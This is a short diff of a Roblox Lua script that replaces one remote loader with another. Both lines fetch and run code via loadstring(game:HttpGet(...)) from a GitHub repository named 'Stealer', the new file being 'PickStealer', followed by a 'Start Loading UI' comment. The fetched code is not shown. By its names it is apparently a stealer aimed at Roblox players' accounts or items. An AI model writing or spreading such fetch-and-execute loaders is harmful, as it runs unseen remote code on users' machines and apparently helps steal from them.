@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Shalangtalagas/Stealer/refs/heads/main/xscripts", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Shalangtalagas/Stealer/refs/heads/main/PickStealer", true))()
 
 --// Start Loading UI
 task.spawn(function()
